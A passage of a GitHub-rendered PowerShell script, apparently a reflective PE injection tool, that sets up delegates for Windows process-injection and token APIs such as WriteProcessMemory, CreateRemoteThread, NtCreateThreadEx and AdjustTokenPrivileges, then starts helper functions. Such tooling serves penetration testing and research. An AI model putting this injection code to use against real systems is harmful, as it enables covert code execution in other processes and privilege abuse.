          <td id="LC692" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Functions</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name WaitForSingleObject <span class="pl-k">-</span>Value <span class="pl-smi">$WaitForSingleObject</span></td>
        </tr>
        <tr>
          <td id="L693" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="693"></td>
          <td id="LC693" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L694" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="694"></td>
          <td id="LC694" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$WriteProcessMemoryAddr</span> <span class="pl-k">=</span> <span class="pl-c1">Get-ProcAddress</span> kernel32.dll WriteProcessMemory</td>
        </tr>
        <tr>
          <td id="L695" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="695"></td>
          <td id="LC695" class="blob-code blob-code-inner js-file-line">        <span class="pl-smi">$WriteProcessMemoryDelegate</span> <span class="pl-k">=</span> <span class="pl-c1">Get-DelegateType</span> <span class="pl-k">@</span>([<span class="pl-k">IntPtr</span>]<span class="pl-k">,</span> [<span class="pl-k">IntPtr</span>]<span class="pl-k">,</span> [<span class="pl-k">IntPtr</span>]<span class="pl-k">,</span> [<span class="pl-k">UIntPtr</span>]<span class="pl-k">,</span> [<span class="pl-k">UIntPtr</span>].MakeByRefType()) ([<span class="pl-k">Bool</span>])</td>
        </tr>
        <tr>
          <td id="L696" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="696"></td>
          <td id="LC696" class="blob-code blob-code-inner js-file-line">        <span class="pl-smi">$WriteProcessMemory</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::GetDelegateForFunctionPointer(<span class="pl-smi">$WriteProcessMemoryAddr</span><span class="pl-k">,</span> <span class="pl-smi">$WriteProcessMemoryDelegate</span>)</td>
        </tr>
        <tr>
          <td id="L697" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="697"></td>
          <td id="LC697" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Functions</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name WriteProcessMemory <span class="pl-k">-</span>Value <span class="pl-smi">$WriteProcessMemory</span></td>
        </tr>
        <tr>
          <td id="L698" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="698"></td>
          <td id="LC698" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L699" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="699"></td>
          <td id="LC699" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$ReadProcessMemoryAddr</span> <span class="pl-k">=</span> <span class="pl-c1">Get-ProcAddress</span> kernel32.dll ReadProcessMemory</td>
        </tr>
        <tr>
          <td id="L700" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="700"></td>
          <td id="LC700" class="blob-code blob-code-inner js-file-line">        <span class="pl-smi">$ReadProcessMemoryDelegate</span> <span class="pl-k">=</span> <span class="pl-c1">Get-DelegateType</span> <span class="pl-k">@</span>([<span class="pl-k">IntPtr</span>]<span class="pl-k">,</span> [<span class="pl-k">IntPtr</span>]<span class="pl-k">,</span> [<span class="pl-k">IntPtr</span>]<span class="pl-k">,</span> [<span class="pl-k">UIntPtr</span>]<span class="pl-k">,</span> [<span class="pl-k">UIntPtr</span>].MakeByRefType()) ([<span class="pl-k">Bool</span>])</td>
        </tr>
        <tr>
          <td id="L701" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="701"></td>
          <td id="LC701" class="blob-code blob-code-inner js-file-line">        <span class="pl-smi">$ReadProcessMemory</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::GetDelegateForFunctionPointer(<span class="pl-smi">$ReadProcessMemoryAddr</span><span class="pl-k">,</span> <span class="pl-smi">$ReadProcessMemoryDelegate</span>)</td>
        </tr>
        <tr>
          <td id="L702" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="702"></td>
          <td id="LC702" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Functions</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name ReadProcessMemory <span class="pl-k">-</span>Value <span class="pl-smi">$ReadProcessMemory</span></td>
        </tr>
        <tr>
          <td id="L703" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="703"></td>
          <td id="LC703" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L704" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="704"></td>
          <td id="LC704" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$CreateRemoteThreadAddr</span> <span class="pl-k">=</span> <span class="pl-c1">Get-ProcAddress</span> kernel32.dll CreateRemoteThread</td>
        </tr>
        <tr>
          <td id="L705" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="705"></td>
          <td id="LC705" class="blob-code blob-code-inner js-file-line">        <span class="pl-smi">$CreateRemoteThreadDelegate</span> <span class="pl-k">=</span> <span class="pl-c1">Get-DelegateType</span> <span class="pl-k">@</span>([<span class="pl-k">IntPtr</span>]<span class="pl-k">,</span> [<span class="pl-k">IntPtr</span>]<span class="pl-k">,</span> [<span class="pl-k">UIntPtr</span>]<span class="pl-k">,</span> [<span class="pl-k">IntPtr</span>]<span class="pl-k">,</span> [<span class="pl-k">IntPtr</span>]<span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> [<span class="pl-k">IntPtr</span>]) ([<span class="pl-k">IntPtr</span>])</td>
        </tr>
        <tr>
          <td id="L706" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="706"></td>
          <td id="LC706" class="blob-code blob-code-inner js-file-line">        <span class="pl-smi">$CreateRemoteThread</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::GetDelegateForFunctionPointer(<span class="pl-smi">$CreateRemoteThreadAddr</span><span class="pl-k">,</span> <span class="pl-smi">$CreateRemoteThreadDelegate</span>)</td>
        </tr>
        <tr>
          <td id="L707" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="707"></td>
          <td id="LC707" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Functions</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name CreateRemoteThread <span class="pl-k">-</span>Value <span class="pl-smi">$CreateRemoteThread</span></td>
        </tr>
        <tr>
          <td id="L708" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="708"></td>
          <td id="LC708" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L709" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="709"></td>
          <td id="LC709" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$GetExitCodeThreadAddr</span> <span class="pl-k">=</span> <span class="pl-c1">Get-ProcAddress</span> kernel32.dll GetExitCodeThread</td>
        </tr>
        <tr>
          <td id="L710" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="710"></td>
          <td id="LC710" class="blob-code blob-code-inner js-file-line">        <span class="pl-smi">$GetExitCodeThreadDelegate</span> <span class="pl-k">=</span> <span class="pl-c1">Get-DelegateType</span> <span class="pl-k">@</span>([<span class="pl-k">IntPtr</span>]<span class="pl-k">,</span> [<span class="pl-k">Int32</span>].MakeByRefType()) ([<span class="pl-k">Bool</span>])</td>
        </tr>
        <tr>
          <td id="L711" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="711"></td>
          <td id="LC711" class="blob-code blob-code-inner js-file-line">        <span class="pl-smi">$GetExitCodeThread</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::GetDelegateForFunctionPointer(<span class="pl-smi">$GetExitCodeThreadAddr</span><span class="pl-k">,</span> <span class="pl-smi">$GetExitCodeThreadDelegate</span>)</td>
        </tr>
        <tr>
          <td id="L712" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="712"></td>
          <td id="LC712" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Functions</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name GetExitCodeThread <span class="pl-k">-</span>Value <span class="pl-smi">$GetExitCodeThread</span></td>
        </tr>
        <tr>
          <td id="L713" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="713"></td>
          <td id="LC713" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L714" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="714"></td>
          <td id="LC714" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$OpenThreadTokenAddr</span> <span class="pl-k">=</span> <span class="pl-c1">Get-ProcAddress</span> Advapi32.dll OpenThreadToken</td>
        </tr>
        <tr>
          <td id="L715" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="715"></td>
          <td id="LC715" class="blob-code blob-code-inner js-file-line">        <span class="pl-smi">$OpenThreadTokenDelegate</span> <span class="pl-k">=</span> <span class="pl-c1">Get-DelegateType</span> <span class="pl-k">@</span>([<span class="pl-k">IntPtr</span>]<span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> [<span class="pl-k">Bool</span>]<span class="pl-k">,</span> [<span class="pl-k">IntPtr</span>].MakeByRefType()) ([<span class="pl-k">Bool</span>])</td>
        </tr>
        <tr>
          <td id="L716" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="716"></td>
          <td id="LC716" class="blob-code blob-code-inner js-file-line">        <span class="pl-smi">$OpenThreadToken</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::GetDelegateForFunctionPointer(<span class="pl-smi">$OpenThreadTokenAddr</span><span class="pl-k">,</span> <span class="pl-smi">$OpenThreadTokenDelegate</span>)</td>
        </tr>
        <tr>
          <td id="L717" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="717"></td>
          <td id="LC717" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Functions</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name OpenThreadToken <span class="pl-k">-</span>Value <span class="pl-smi">$OpenThreadToken</span></td>
        </tr>
        <tr>
          <td id="L718" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="718"></td>
          <td id="LC718" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L719" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="719"></td>
          <td id="LC719" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$GetCurrentThreadAddr</span> <span class="pl-k">=</span> <span class="pl-c1">Get-ProcAddress</span> kernel32.dll GetCurrentThread</td>
        </tr>
        <tr>
          <td id="L720" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="720"></td>
          <td id="LC720" class="blob-code blob-code-inner js-file-line">        <span class="pl-smi">$GetCurrentThreadDelegate</span> <span class="pl-k">=</span> <span class="pl-c1">Get-DelegateType</span> <span class="pl-k">@</span>() ([<span class="pl-k">IntPtr</span>])</td>
        </tr>
        <tr>
          <td id="L721" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="721"></td>
          <td id="LC721" class="blob-code blob-code-inner js-file-line">        <span class="pl-smi">$GetCurrentThread</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::GetDelegateForFunctionPointer(<span class="pl-smi">$GetCurrentThreadAddr</span><span class="pl-k">,</span> <span class="pl-smi">$GetCurrentThreadDelegate</span>)</td>
        </tr>
        <tr>
          <td id="L722" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="722"></td>
          <td id="LC722" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Functions</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name GetCurrentThread <span class="pl-k">-</span>Value <span class="pl-smi">$GetCurrentThread</span></td>
        </tr>
        <tr>
          <td id="L723" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="723"></td>
          <td id="LC723" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L724" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="724"></td>
          <td id="LC724" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$AdjustTokenPrivilegesAddr</span> <span class="pl-k">=</span> <span class="pl-c1">Get-ProcAddress</span> Advapi32.dll AdjustTokenPrivileges</td>
        </tr>
        <tr>
          <td id="L725" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="725"></td>
          <td id="LC725" class="blob-code blob-code-inner js-file-line">        <span class="pl-smi">$AdjustTokenPrivilegesDelegate</span> <span class="pl-k">=</span> <span class="pl-c1">Get-DelegateType</span> <span class="pl-k">@</span>([<span class="pl-k">IntPtr</span>]<span class="pl-k">,</span> [<span class="pl-k">Bool</span>]<span class="pl-k">,</span> [<span class="pl-k">IntPtr</span>]<span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> [<span class="pl-k">IntPtr</span>]<span class="pl-k">,</span> [<span class="pl-k">IntPtr</span>]) ([<span class="pl-k">Bool</span>])</td>
        </tr>
        <tr>
          <td id="L726" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="726"></td>
          <td id="LC726" class="blob-code blob-code-inner js-file-line">        <span class="pl-smi">$AdjustTokenPrivileges</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::GetDelegateForFunctionPointer(<span class="pl-smi">$AdjustTokenPrivilegesAddr</span><span class="pl-k">,</span> <span class="pl-smi">$AdjustTokenPrivilegesDelegate</span>)</td>
        </tr>
        <tr>
          <td id="L727" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="727"></td>
          <td id="LC727" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Functions</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name AdjustTokenPrivileges <span class="pl-k">-</span>Value <span class="pl-smi">$AdjustTokenPrivileges</span></td>
        </tr>
        <tr>
          <td id="L728" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="728"></td>
          <td id="LC728" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L729" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="729"></td>
          <td id="LC729" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$LookupPrivilegeValueAddr</span> <span class="pl-k">=</span> <span class="pl-c1">Get-ProcAddress</span> Advapi32.dll LookupPrivilegeValueA</td>
        </tr>
        <tr>
          <td id="L730" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="730"></td>
          <td id="LC730" class="blob-code blob-code-inner js-file-line">        <span class="pl-smi">$LookupPrivilegeValueDelegate</span> <span class="pl-k">=</span> <span class="pl-c1">Get-DelegateType</span> <span class="pl-k">@</span>([<span class="pl-k">String</span>]<span class="pl-k">,</span> [<span class="pl-k">String</span>]<span class="pl-k">,</span> [<span class="pl-k">IntPtr</span>]) ([<span class="pl-k">Bool</span>])</td>
        </tr>
        <tr>
          <td id="L731" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="731"></td>
          <td id="LC731" class="blob-code blob-code-inner js-file-line">        <span class="pl-smi">$LookupPrivilegeValue</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::GetDelegateForFunctionPointer(<span class="pl-smi">$LookupPrivilegeValueAddr</span><span class="pl-k">,</span> <span class="pl-smi">$LookupPrivilegeValueDelegate</span>)</td>
        </tr>
        <tr>
          <td id="L732" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="732"></td>
          <td id="LC732" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Functions</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name LookupPrivilegeValue <span class="pl-k">-</span>Value <span class="pl-smi">$LookupPrivilegeValue</span></td>
        </tr>
        <tr>
          <td id="L733" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="733"></td>
          <td id="LC733" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L734" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="734"></td>
          <td id="LC734" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$ImpersonateSelfAddr</span> <span class="pl-k">=</span> <span class="pl-c1">Get-ProcAddress</span> Advapi32.dll ImpersonateSelf</td>
        </tr>
        <tr>
          <td id="L735" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="735"></td>
          <td id="LC735" class="blob-code blob-code-inner js-file-line">        <span class="pl-smi">$ImpersonateSelfDelegate</span> <span class="pl-k">=</span> <span class="pl-c1">Get-DelegateType</span> <span class="pl-k">@</span>([<span class="pl-k">Int32</span>]) ([<span class="pl-k">Bool</span>])</td>
        </tr>
        <tr>
          <td id="L736" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="736"></td>
          <td id="LC736" class="blob-code blob-code-inner js-file-line">        <span class="pl-smi">$ImpersonateSelf</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::GetDelegateForFunctionPointer(<span class="pl-smi">$ImpersonateSelfAddr</span><span class="pl-k">,</span> <span class="pl-smi">$ImpersonateSelfDelegate</span>)</td>
        </tr>
        <tr>
          <td id="L737" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="737"></td>
          <td id="LC737" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Functions</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name ImpersonateSelf <span class="pl-k">-</span>Value <span class="pl-smi">$ImpersonateSelf</span></td>
        </tr>
        <tr>
          <td id="L738" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="738"></td>
          <td id="LC738" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L739" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="739"></td>
          <td id="LC739" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$NtCreateThreadExAddr</span> <span class="pl-k">=</span> <span class="pl-c1">Get-ProcAddress</span> NtDll.dll NtCreateThreadEx</td>
        </tr>
        <tr>
          <td id="L740" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="740"></td>
          <td id="LC740" class="blob-code blob-code-inner js-file-line">        <span class="pl-smi">$NtCreateThreadExDelegate</span> <span class="pl-k">=</span> <span class="pl-c1">Get-DelegateType</span> <span class="pl-k">@</span>([<span class="pl-k">IntPtr</span>].MakeByRefType()<span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> [<span class="pl-k">IntPtr</span>]<span class="pl-k">,</span> [<span class="pl-k">IntPtr</span>]<span class="pl-k">,</span> [<span class="pl-k">IntPtr</span>]<span class="pl-k">,</span> [<span class="pl-k">IntPtr</span>]<span class="pl-k">,</span> [<span class="pl-k">Bool</span>]<span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> [<span class="pl-k">IntPtr</span>]) ([<span class="pl-k">UInt32</span>])</td>
        </tr>
        <tr>
          <td id="L741" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="741"></td>
          <td id="LC741" class="blob-code blob-code-inner js-file-line">        <span class="pl-smi">$NtCreateThreadEx</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::GetDelegateForFunctionPointer(<span class="pl-smi">$NtCreateThreadExAddr</span><span class="pl-k">,</span> <span class="pl-smi">$NtCreateThreadExDelegate</span>)</td>
        </tr>
        <tr>
          <td id="L742" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="742"></td>
          <td id="LC742" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Functions</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name NtCreateThreadEx <span class="pl-k">-</span>Value <span class="pl-smi">$NtCreateThreadEx</span></td>
        </tr>
        <tr>
          <td id="L743" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="743"></td>
          <td id="LC743" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L744" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="744"></td>
          <td id="LC744" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$IsWow64ProcessAddr</span> <span class="pl-k">=</span> <span class="pl-c1">Get-ProcAddress</span> Kernel32.dll IsWow64Process</td>
        </tr>
        <tr>
          <td id="L745" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="745"></td>
          <td id="LC745" class="blob-code blob-code-inner js-file-line">        <span class="pl-smi">$IsWow64ProcessDelegate</span> <span class="pl-k">=</span> <span class="pl-c1">Get-DelegateType</span> <span class="pl-k">@</span>([<span class="pl-k">IntPtr</span>]<span class="pl-k">,</span> [<span class="pl-k">Bool</span>].MakeByRefType()) ([<span class="pl-k">Bool</span>])</td>
        </tr>
        <tr>
          <td id="L746" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="746"></td>
          <td id="LC746" class="blob-code blob-code-inner js-file-line">        <span class="pl-smi">$IsWow64Process</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::GetDelegateForFunctionPointer(<span class="pl-smi">$IsWow64ProcessAddr</span><span class="pl-k">,</span> <span class="pl-smi">$IsWow64ProcessDelegate</span>)</td>
        </tr>
        <tr>
          <td id="L747" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="747"></td>
          <td id="LC747" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Functions</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name IsWow64Process <span class="pl-k">-</span>Value <span class="pl-smi">$IsWow64Process</span></td>
        </tr>
        <tr>
          <td id="L748" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="748"></td>
          <td id="LC748" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L749" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="749"></td>
          <td id="LC749" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$CreateThreadAddr</span> <span class="pl-k">=</span> <span class="pl-c1">Get-ProcAddress</span> Kernel32.dll CreateThread</td>
        </tr>
        <tr>
          <td id="L750" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="750"></td>
          <td id="LC750" class="blob-code blob-code-inner js-file-line">        <span class="pl-smi">$CreateThreadDelegate</span> <span class="pl-k">=</span> <span class="pl-c1">Get-DelegateType</span> <span class="pl-k">@</span>([<span class="pl-k">IntPtr</span>]<span class="pl-k">,</span> [<span class="pl-k">IntPtr</span>]<span class="pl-k">,</span> [<span class="pl-k">IntPtr</span>]<span class="pl-k">,</span> [<span class="pl-k">IntPtr</span>]<span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> [<span class="pl-k">UInt32</span>].MakeByRefType()) ([<span class="pl-k">IntPtr</span>])</td>
        </tr>
        <tr>
          <td id="L751" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="751"></td>
          <td id="LC751" class="blob-code blob-code-inner js-file-line">        <span class="pl-smi">$CreateThread</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::GetDelegateForFunctionPointer(<span class="pl-smi">$CreateThreadAddr</span><span class="pl-k">,</span> <span class="pl-smi">$CreateThreadDelegate</span>)</td>
        </tr>
        <tr>
          <td id="L752" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="752"></td>
          <td id="LC752" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Functions</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name CreateThread <span class="pl-k">-</span>Value <span class="pl-smi">$CreateThread</span></td>
        </tr>
        <tr>
          <td id="L753" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="753"></td>
          <td id="LC753" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L754" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="754"></td>
          <td id="LC754" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">return</span> <span class="pl-smi">$Win32Functions</span></td>
        </tr>
        <tr>
          <td id="L755" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="755"></td>
          <td id="LC755" class="blob-code blob-code-inner js-file-line">	}</td>
        </tr>
        <tr>
          <td id="L756" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="756"></td>
          <td id="LC756" class="blob-code blob-code-inner js-file-line">	<span class="pl-c"><span class="pl-c">#</span>####################################</span></td>
        </tr>
        <tr>
          <td id="L757" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="757"></td>
          <td id="LC757" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L758" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="758"></td>
          <td id="LC758" class="blob-code blob-code-inner js-file-line">			</td>
        </tr>
        <tr>
          <td id="L759" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="759"></td>
          <td id="LC759" class="blob-code blob-code-inner js-file-line">	<span class="pl-c"><span class="pl-c">#</span>####################################</span></td>
        </tr>
        <tr>
          <td id="L760" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="760"></td>
          <td id="LC760" class="blob-code blob-code-inner js-file-line">	<span class="pl-c"><span class="pl-c">#</span>##########    HELPERS   ############</span></td>
        </tr>
        <tr>
          <td id="L761" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="761"></td>
          <td id="LC761" class="blob-code blob-code-inner js-file-line">	<span class="pl-c"><span class="pl-c">#</span>####################################</span></td>
        </tr>
        <tr>
          <td id="L762" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="762"></td>
          <td id="LC762" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L763" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="763"></td>
          <td id="LC763" class="blob-code blob-code-inner js-file-line">	<span class="pl-c"><span class="pl-c">#</span>Powershell only does signed arithmetic, so if we want to calculate memory addresses we have to use this function</span></td>
        </tr>
        <tr>
          <td id="L764" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="764"></td>
          <td id="LC764" class="blob-code blob-code-inner js-file-line">	<span class="pl-c"><span class="pl-c">#</span>This will add signed integers as if they were unsigned integers so we can accurately calculate memory addresses</span></td>
        </tr>
        <tr>
          <td id="L765" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="765"></td>
          <td id="LC765" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">Function</span> <span class="pl-en">Sub-SignedIntAsUnsigned</span></td>
        </tr>
        <tr>
          <td id="L766" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="766"></td>
          <td id="LC766" class="blob-code blob-code-inner js-file-line">	{</td>
        </tr>
        <tr>
          <td id="L767" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="767"></td>
          <td id="LC767" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">Param</span>(</td>
        </tr>
        <tr>
          <td id="L768" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="768"></td>
          <td id="LC768" class="blob-code blob-code-inner js-file-line">		[<span class="pl-c1">Parameter</span>(<span class="pl-v">Position</span> <span class="pl-k">=</span> <span class="pl-c1">0</span><span class="pl-k">,</span> <span class="pl-v">Mandatory</span> <span class="pl-k">=</span> <span class="pl-c1">$true</span>)]</td>
        </tr>
        <tr>
          <td id="L769" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="769"></td>
          <td id="LC769" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">Int64</span>]</td>
        </tr>
        <tr>
